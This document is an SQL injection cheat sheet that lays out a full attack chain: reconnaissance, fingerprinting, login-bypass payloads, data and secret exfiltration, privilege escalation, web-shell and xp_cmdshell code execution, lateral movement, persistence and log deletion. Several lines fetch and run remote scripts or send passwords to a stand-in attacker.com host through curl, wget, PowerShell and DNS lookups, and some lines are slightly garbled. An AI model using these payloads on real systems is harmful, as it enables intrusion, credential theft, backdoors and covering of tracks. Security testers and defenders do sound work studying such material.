***SQL INJECTION CHEAT SHEET***
***Reconnaissance and entry points for SQL Injection***

**1. Common vulnerability entry points for SQLi**
Identify entry points using tools like **burp, nmap, dirb, nikto, google dorks
  login forms
  search fields
  URL parameters (?id=1)
  HTTP headers (User-Agent, Referrer)
  cookies
  file upload forms

**2. Check for input validation**
Try basic payloads (', ", ;, --, ', ")to see application response to Look for error messages, unexpected behaviors or delays that may indicate SQLi vulnerability

**3. Test**
To check if SQL injection is possible
Try injecting into a parameter eg: product.asp?1d=4 (SMO) (NUMERIC)
  product.asp?id=5-1 (returns the result id=4)
  product.asp?id=4 OR 1=1
Trying to inject into product.asp?name=Book **(STRING)**
  product.asp?name=Bo'%2b'ok
  product.asp?name=Bo' || 'ok (only MO)
  product.asp?name=Book' OR 'x'='x

***Type of Database in use:***
Shutting down SQL Server
  ';shutdown --

inject error inducing payloads:
  '
  "
  ')
  ")
  OR 1=1
  ' AND 1=CONVERT(int, 'a')-- -- For MSSQL

| Error Fragment                         | Likely DBMS         |
| -------------------------------------- | ------------------- |
| You have an error in your SQL syntax   | MySQL               |
| unclosed quotation mark                | MSSQL               |
| ORA-00933 or ORA-00921                 | Oracle              |
| syntax error at or near                | PostgreSQL          |
| SQLite3::SQLException                  | SQLite              |
| MongoError or Unexpected token $       | MongoDB / NoSQL     |

***Database Banner grabbing***
MySQL:  SELECT @@version;
        SELECT version();
        INSERT INTO members(id, user, pass) VALUES(1,''+SUBSTRING(@@version,1,10) ,10)

Input through URL parameter to reveal DB version
        ?id=1 UNION SELECT null, @@version -- -

MSSQL:  SELECT @@version;
        INSERT INTO members(id, user, pass) VALUES(1,''+SUBSTRING(@@version,1,10) ,10)

PostgreSQL: SELECT version();
            UNION SELECT NULL, version(), NULL

SQLite: sqlite_version()
        UNION SELECT NULL, sqlite_version(),NULL;
        SELECT version FROM PRODUCT_COMPONENT_VERSION WHERE product LIKE 'Oracle Database%';

Oracle: SELECT * FROM v$version;
        Input through URL parameter to reveal DB version
        ?id=1 UNION SELECT banner, null FROM v$version -- -

***Enumerate Database structure***
MySQL:
        UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = 'target_db' -- -

user-defined tables
        SELECT table_name FROM information_schema.tables WHERE table_schema = 'databasename'

column names:
        SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'tablename'

Oracle:
        UNION SELECT table_name, null FROM all_tables -- -

PostgreSQL:
        UNION SELECT table_name, null FROM information_schema.tables WHERE table _schema = 'public' -- -

user-defined tables:
        SELECT \* FROM all\_tables WHERE OWNER = 'DATABASE\_NAME' column names:
        SELECT \* FROM all\_col\_comments WHERE TABLE\_NAME = 'TABLE'

***Error-based ways to discover column information***
**1. Finding column names using HAVING and GROUP BY (S)**
  ' HAVING 1=1 -- (triggers error 1)
  ' GROUP BY table.columnfromerror1 HAVING 1=1 -- (triggers error 2)
  ' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- (triggers error 3)
  ' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 --
Once no more errors being shown you are done

**2. Testing for column number (MS0+)**
  ?id=1 ORDER BY 1 --
  ?id=1 ORDER BY 2 --
  ?id=1 ORDER BY 3 --
  ?id=1 ORDER BY n --
  If an error shows, you've found the number of columns

**3. Ways of finding the column type**
  ' UNION SELECT sum(columntofind) from users-- (S)
If no error is displaying it means the column is numeric

**You can also use cast() or convert() in a similar way, for example:**
  SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--

  11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-
No error—the syntax is correct and MS SQL Server is used. Proceeding.

  11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-
No error—we now know the first column is an integer.

  11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --
  Microsoft OLE DB Provider for SQL Server error '80040e07'
  Explicit conversion from data type int to image is not allowed.
Error! The second column is not an integer.

  11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –-
No error—the second column is a string.

  11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –-
Error! The third column is not an integer…

Rinse and repeat until you have all the column types mapped out.

**login forms injection**
  ' OR '1'='1 --
  ' OR '1'='1'-- -
  ' OR 1=1 LIMIT 1-- -
  ' OR '1'='1' --
  ' OR 1=1 --
  " OR 1=1 --
  ' OR '1'='1'/\*
  admin' --
  admin' OR '1'='1'#
  admin')-- -
  admin' --
  admin' #
  admin'/\*
  admin'--
  admin' or '1'='1
  admin' or true--
  admin') or ('1'='1-- -
  admin") or ("1"="1"-- -
  ' or true--
  ' or 1=1--
  ' or 1=1#
  ' or 1=1/*
  ' or 1=1 LIMIT 1-- -
  ' or 'a'='a
  ' OR 1=1#
  ' OR ''='

Payloads that bypass filtered characters
  OR 1=1
  OR TRUE
  OR 1=1-- -
  OR 1=1#
  OR 1=1/*
  OR 1 LIKE 1
  OR 1 BETWEEN 0 AND 2
  OR EXISTS(SELECT * FROM users)

***Exfiltration & pivoting***
**Exfiltration techniques Data dumps (UNION SELECT) This is just a classic exfiltration**
    ?id=1 UNION SELECT id, username, password FROM users-- - 
if you know column count and types, you can dump entire tables. 
    sqlmap -u URL --dump --batch

**exfil sensitive configs target values: AWS Keys, SMTP creds, API tokens, S3 buckets, internal IP/Domain**
    SELECT * FROM config; 
    SELECT * FROM settings; 
    SELECT * FROM env; 
    SELECT value FROM settings WHERE key LIKE '%secret%';

**Out-of-Band exfil Used in blind SQLi, great for stealth and bypassing WAFs MySQL DNS-based:**
    LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'\\.attacker.com\\')); MSSQL: exec xp_dirtree '\\attacker.com\share' PostgreSQL: COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/data.txt'

**Boolean/time-based blind exfil**
If UNION/errors don’t work: 
    1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'a'-- - 
    Automate with: 
        sqlmap -u URL --technique=T --dbs

***Pivoting and lateral movement***-
**In the application layer(SQL Access) look for ways to:**
    -steal more credentials(RDS, Redis, SMTP)
    -write to disk (RCE)
    -Access other internal services
    -poison internal cache or jobs
credential extraction-pivot Look for: 
    SELECT * FROM users; SELECT * FROM environment; SELECT * FROM credentials; Find SMTP/Redis/AWS keys: aws_access_key=AKIA.... smtp://username:password@mail.internal 
    if creds found try logging into: 
        Internal admin panels 
        S3 buckets 
        SSH
        FTP (if creds found) 
        Database consoles

**RCE via SQLi (File Write/ Function Abuse)**
If you can write files: 
    MySQL (Linux/PHP): 
        UNION SELECT "" INTO OUTFILE '/var/www/html/shell.php' then: GET /shell.php?cmd=whoami 
    MSSQL: 
        exec xp_cmdshell 'powershell -enc ...'

**Access other internal systems(service pivot)**
Use SQLi to: 
Dump internal subdomains: 
    SELECT host FROM logs WHERE referrer LIKE '%internal%' 
Pivot to Redis if Redis is reachable and unauthenticated, poison it: 
    SET CONFIG rewrite-command 'FLUSHALL' 'GETFLAG' Poison scheduled jobs or cron via DB injections: INSERT INTO cron (cmd) VALUES ('curl http://attacker.com/shell.sh | bash');

**GraphQL/API Endpoint Pivot Found an internal API?**
Abuse SQLi in it: 
    query { user(id: "1' UNION SELECT password FROM users--") { id } }

**Steal session/Auth Tokens**
        SELECT token, ip FROM sessions; 
    or: 
        SELECT cookie FROM analytics_logs; 
    then Replay: 
        Cookie: session=stolen_token

***SQLi Exploitation Flow (Textual Flowchart)***
[1] Entry Point Discovery
  └─► Scan input vectors (forms, URLs, headers, cookies, GraphQL)
  └─► Check for injectable parameters (manual or with tools like sqlmap, Burp)

[2] Initial SQL Injection
  └─► Test for authentication bypass or query manipulation
  └─► Bypass login with ' OR '1'='1
  └─► Trigger DB errors or anomalies (timing, boolean)

[3] DBMS Fingerprinting
  └─► Extract database type/version
  └─► SELECT @@version / version()
  └─► sqlmap --banner

[4] Table & Column Enumeration
  └─► Find structure of DB
  └─► sqlmap --tables / --columns
  └─► Manually with UNION SELECT or information_schema

[5] Data Exfiltration
  └─► Dump sensitive data (users, passwords, tokens, emails)
  └─► sqlmap --dump
  └─► UNION SELECT username, password FROM users
  └─► Blind SQLi (boolean/time-based inference)

[6] Privilege Escalation
  └─► Modify user roles or inject new admin
  └─► UPDATE users SET is_admin=1 WHERE username='guest'
  └─► INSERT INTO users (...) VALUES (...)

[7] Remote Code Execution (RCE)
  └─► Write to file or abuse DB functions
  └─► MySQL: SELECT "" INTO OUTFILE '/var/www/html/shell.php'
  └─► MSSQL: xp_cmdshell 'powershell reverse shell'

[8] Lateral Movement
  └─► Access other services using stolen credentials
  └─► SSH, SMB, admin panels, internal APIs
  └─► Pivot to other DBs or machines

[9] Cloud & Infra Pivoting
  └─► Exfiltrate API keys (AWS, GCP, Azure) or secrets
  └─► SELECT * FROM env WHERE key LIKE '%key%'
  └─► Access cloud storage (S3, buckets, RDS)
  └─► Exploit misconfigured services (Redis, Jenkins, Docker)

[10] Persistence
  └─► Create backdoor accounts
  └─► INSERT INTO users (admin) ...
  └─► Set scheduled jobs or cron tasks
  └─► Inject reverse shell into cron or task scheduler
  └─► Webshell deployment or DB triggers

[11] Cleanup (Optional in red team or stealth testing)
  └─► Remove logs, drop shell, disable accounts
  └─► DELETE FROM logs WHERE user='attacker'

***PoC Payloads: Steps 5–9***
**Step 5: Data Exfiltration**
MySQL:      ?id=1 UNION SELECT username, password FROM users-- -
MSSQL:      ?id=1; SELECT name, pass FROM members--
PostgreSQL: ?id=1 UNION SELECT username || ':' || password FROM auth_table--

*Blind SQLi (Time-Based - MySQL)*
  ?id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)-- -

**Step 6: Privilege Escalation**
Set Yourself as Admin
  '; UPDATE users SET role='admin' WHERE username='guest';--

Add a New Admin User (MySQL)
  '; INSERT INTO users (username, password, role) VALUES ('haxor', '123456', 'admin');--

MSSQL Escalation via Stacked Queries
  '; EXEC sp_addlogin 'haxor', 'Password123!'; EXEC sp_addsrvrolemember 'haxor', 'sysadmin';--

**Step 7: Remote Code Execution (RCE)**
MySQL – Write Web Shell
  ?id=1 UNION SELECT "" INTO OUTFILE '/var/www/html/shell.php'-- -

PostgreSQL – Command Execution
  COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh | bash';

MSSQL – Using xp_cmdshell
  '; EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest http://attacker.com/shell.exe -OutFile C:\\shell.exe && Start-Process C:\\shell.exe"';--
                            *Prerequisite: xp_cmdshell must be enabled.*

**Step 8: Lateral Movement**
Enumerate Internal Services (from logs)
  UNION SELECT DISTINCT ip_address FROM logs WHERE url LIKE '%admin%'-- -

Extract AWS Keys
  SELECT config_value FROM config WHERE config_key LIKE '%aws%' OR config_key LIKE '%s3%';

Poison Internal Job Queue (Redis-style)
  INSERT INTO job_queue (task) VALUES ('curl http://attacker.com/malware.sh | bash');

Reuse Creds in Internal Admin Panel (if auth table leaked)
  POST /admin/login
  username=haxor&password=stolenpass

**Step 9: Persistence**
Add a New Web Admin
  INSERT INTO users (username, password, role) VALUES ('backdoor', 'pass123', 'admin');

Inject into Cron Job Table
  INSERT INTO cron_jobs (command, schedule) VALUES ('wget http://attacker.com/rev.sh | bash', '* * * * *');

Create a DB Trigger for Auto-Reexecution
  CREATE TRIGGER persist AFTER INSERT ON users
  FOR EACH ROW BEGIN
  CALL system('curl http://attacker.com/revive.sh | sh');